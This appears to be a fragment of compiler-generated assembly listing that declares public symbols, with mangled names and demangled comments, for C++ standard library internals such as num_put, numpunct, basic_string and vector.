PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DK@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_J@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DN@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DO@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?do_put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::do_put
PUBLIC	?_Ffmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ffmt
PUBLIC	?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput
PUBLIC	?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
PUBLIC	?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
PUBLIC	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
PUBLIC	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
PUBLIC	??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`scalar deleting destructor'
PUBLIC	??0?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAA@PEAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::ostreambuf_iterator<char,std::char_traits<char> >
PUBLIC	??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator=
PUBLIC	??D?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator*
PUBLIC	??E?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@XZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::operator++
PUBLIC	?failed@?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEBA_NXZ ; std::ostreambuf_iterator<char,std::char_traits<char> >::failed
PUBLIC	??$addressof@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_Vector_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_Vector_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::emplace_back<wchar_t const &>
PUBLIC	??$forward@AEB_W@std@@YAAEB_WAEB_W@Z		; std::forward<wchar_t const &>
PUBLIC	??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_one_at_back<wchar_t const &>
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::emplace_back<unsigned char const &>
PUBLIC	??$forward@AEBE@std@@YAAEBEAEBE@Z		; std::forward<unsigned char const &>
PUBLIC	??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_one_at_back<unsigned char const &>
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1>::_Compressed_pair<std::allocator<unsigned char>,std::_Vector_val<std::_Simple_types<unsigned char> >,1><>
PUBLIC	??$_Destroy_range@V?$allocator@D@std@@@std@@YAXPEADQEADAEAV?$allocator@D@0@@Z ; std::_Destroy_range<std::allocator<char> >
PUBLIC	??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z ; std::vector<char,std::allocator<char> >::emplace_back<char const &>
PUBLIC	??$forward@AEBD@std@@YAAEBDAEBD@Z		; std::forward<char const &>
PUBLIC	??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_one_at_back<char const &>
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_Vector_val<std::_Simple_types<char> >,1><>
PUBLIC	??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z ; std::_Traits_find<std::char_traits<wchar_t> >
PUBLIC	??$addressof@V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > >
PUBLIC	??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z ; std::_Pocma<std::allocator<wchar_t> >
PUBLIC	??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::move<std::allocator<wchar_t> &>
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><>
PUBLIC	??$_Convert_size@_K@std@@YA_K_K@Z		; std::_Convert_size<unsigned __int64>
PUBLIC	??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
PUBLIC	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z ; std::_Traits_find<std::char_traits<char> >
PUBLIC	??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::move<std::allocator<char> &>
PUBLIC	??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
PUBLIC	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
PUBLIC	??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<0,char>
PUBLIC	??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
PUBLIC	??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>
PUBLIC	??$_Float_put_desired_precision@O@std@@YAH_JH@Z	; std::_Float_put_desired_precision<long double>
PUBLIC	??$_Float_put_desired_precision@N@std@@YAH_JH@Z	; std::_Float_put_desired_precision<double>
PUBLIC	??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z ; std::use_facet<std::numpunct<char> >
PUBLIC	?decimal_point@?$numpunct@D@std@@QEBADXZ	; std::numpunct<char>::decimal_point
PUBLIC	?thousands_sep@?$numpunct@D@std@@QEBADXZ	; std::numpunct<char>::thousands_sep
PUBLIC	?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::grouping
PUBLIC	?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::falsename
PUBLIC	?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::truename
PUBLIC	??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z	; std::numpunct<char>::numpunct<char>
PUBLIC	?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::numpunct<char>::_Getcat
PUBLIC	??1?$numpunct@D@std@@MEAA@XZ			; std::numpunct<char>::~numpunct<char>
PUBLIC	?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z ; std::numpunct<char>::_Init
PUBLIC	?do_decimal_point@?$numpunct@D@std@@MEBADXZ	; std::numpunct<char>::do_decimal_point
PUBLIC	?do_thousands_sep@?$numpunct@D@std@@MEBADXZ	; std::numpunct<char>::do_thousands_sep
PUBLIC	?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::do_grouping
PUBLIC	?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::do_falsename
PUBLIC	?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::do_truename
PUBLIC	?_Tidy@?$numpunct@D@std@@AEAAXXZ		; std::numpunct<char>::_Tidy
PUBLIC	??_G?$numpunct@D@std@@MEAAPEAXI@Z		; std::numpunct<char>::`scalar deleting destructor'
PUBLIC	??$move@AEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YA$$QEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ; std::move<std::basic_string<char,std::char_traits<char>,std::allocator<char> > &>
PUBLIC	??$_Destroy_range@V?$allocator@_W@std@@@std@@YAXPEA_WQEA_WAEAV?$allocator@_W@0@@Z ; std::_Destroy_range<std::allocator<wchar_t> >
PUBLIC	??$_Destroy_range@V?$allocator@E@std@@@std@@YAXPEAEQEAEAEAV?$allocator@E@0@@Z ; std::_Destroy_range<std::allocator<unsigned char> >
PUBLIC	??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z	; std::_Destroy_in_place<wchar_t *>
PUBLIC	??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>
PUBLIC	??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z		; std::_Unfancy<wchar_t>
PUBLIC	??$_Destroy_in_place@PEAD@std@@YAXAEAPEAD@Z	; std::_Destroy_in_place<char *>
PUBLIC	??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z ; <lambda_319d5e083f45f90dcdce5dce53cbb275>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_319d5e083f45f90dcdce5dce53cbb275>,char>
PUBLIC	??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z ; <lambda_65e615be2a453ca0576c979606f46740>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_65e615be2a453ca0576c979606f46740>,char const *,unsigned __int64>
PUBLIC	??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z ; std::_Construct_in_place<char *,char * &>
PUBLIC	??$_Unfancy@D@std@@YAPEADPEAD@Z			; std::_Unfancy<char>
PUBLIC	?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ ; std::basic_streambuf<char,std::char_traits<char> >::pubsync
PUBLIC	?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputc
PUBLIC	?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z ; std::basic_streambuf<char,std::char_traits<char> >::sputn
PUBLIC	?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pninc
PUBLIC	?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ ; std::basic_streambuf<char,std::char_traits<char> >::_Pnavail
PUBLIC	??$max@_K@std@@YAAEB_KAEB_K0@Z			; std::max<unsigned __int64>
PUBLIC	??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z	; std::_Deallocate<16,0>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$addressof@$$CBV?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@_W@std@@@0@AEBV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > const >
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@D@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > >
PUBLIC	??$addressof@$$CBV?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@YAPEBV?$_String_val@U?$_Simple_types@D@std@@@0@AEBV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<char> > const >
PUBLIC	??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z ; <lambda_b986da8d428e4af07c64af60eec09b61>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_b986da8d428e4af07c64af60eec09b61>,unsigned __int64,unsigned __int64,char>
PUBLIC	??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z ; <lambda_e1befb086ad3257e3f042a63030725f7>::operator()
PUBLIC	??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<<lambda_e1befb086ad3257e3f042a63030725f7>,unsigned __int64,char>
PUBLIC	??$addressof@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@YAPEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@AEAV10@@Z ; std::addressof<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >
PUBLIC	??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z ; std::_Pocma<std::allocator<char> >
PUBLIC	??$min@_K@std@@YAAEB_KAEB_K0@Z			; std::min<unsigned __int64>
PUBLIC	??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z ; std::default_delete<std::_Facet_base>::operator()
PUBLIC	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
PUBLIC	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
PUBLIC	?_Get_first@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAAAEAU?$default_delete@V_Facet_base@std@@@2@XZ ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Get_first
PUBLIC	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
PUBLIC	??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::_Sentry_base
PUBLIC	??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Sentry_base::~_Sentry_base
PUBLIC	??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry
PUBLIC	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
PUBLIC	??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool
PUBLIC	??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<wchar_t> >
PUBLIC	?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::pubsync
PUBLIC	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
PUBLIC	?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputn
PUBLIC	?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pninc
PUBLIC	?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::_Pnavail
PUBLIC	??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z ; std::_Insert_string<wchar_t,std::char_traits<wchar_t>,unsigned __int64>
PUBLIC	??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
PUBLIC	??$_Adl_verify_range@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@V12@@std@@YAXAEBV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@0@Z ; std::_Adl_verify_range<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > >,std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > >
PUBLIC	??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z ; std::_Get_unwrapped<std::_Vector_iterator<std::_Vector_val<std::_Simple_types<wchar_t> > > &>
PUBLIC	??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t *>
PUBLIC	??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_back_with_unused_capacity<wchar_t const &>
PUBLIC	??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z ; std::vector<wchar_t,std::allocator<wchar_t> >::_Emplace_reallocate<wchar_t const &>
PUBLIC	??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_back_with_unused_capacity<unsigned char const &>
PUBLIC	??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z ; std::vector<unsigned char,std::allocator<unsigned char> >::_Emplace_reallocate<unsigned char const &>
PUBLIC	??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_back_with_unused_capacity<char const &>
PUBLIC	??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z ; std::vector<char,std::allocator<char> >::_Emplace_reallocate<char const &>
PUBLIC	??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::forward<std::allocator<wchar_t> >
PUBLIC	??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z ; std::_Construct_in_place<wchar_t *,wchar_t * const &>
PUBLIC	??$forward@V?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::forward<std::allocator<char> >
PUBLIC	??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z ; std::_Construct_in_place<char *,char * const &>
PUBLIC	??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z	; std::addressof<wchar_t *>
PUBLIC	??$_Voidify_iter@PEAPEA_W@std@@YAPEAXPEAPEA_W@Z	; std::_Voidify_iter<wchar_t * *>
PUBLIC	??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z	; std::forward<wchar_t * &>
PUBLIC	??$addressof@PEAD@std@@YAPEAPEADAEAPEAD@Z	; std::addressof<char *>
PUBLIC	??$_Voidify_iter@PEAPEAD@std@@YAPEAXPEAPEAD@Z	; std::_Voidify_iter<char * *>
PUBLIC	??$forward@AEAPEAD@std@@YAAEAPEADAEAPEAD@Z	; std::forward<char * &>
PUBLIC	??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z ; std::exchange<std::_Facet_base *,std::nullptr_t>
PUBLIC	??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>
PUBLIC	??$_Get_size_of_n@$01@std@@YA_K_K@Z		; std::_Get_size_of_n<2>
PUBLIC	??$_Get_size_of_n@$00@std@@YA_K_K@Z		; std::_Get_size_of_n<1>
PUBLIC	??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ ; std::_Tidy_guard<std::numpunct<char> >::~_Tidy_guard<std::numpunct<char> >
PUBLIC	??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z ; std::_Maklocstr<char>
PUBLIC	??$_Maklocchr@D@std@@YADDPEADAEBU_Cvtvec@@@Z	; std::_Maklocchr<char>
PUBLIC	??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z ; std::numpunct<char>::_Getvals<char>
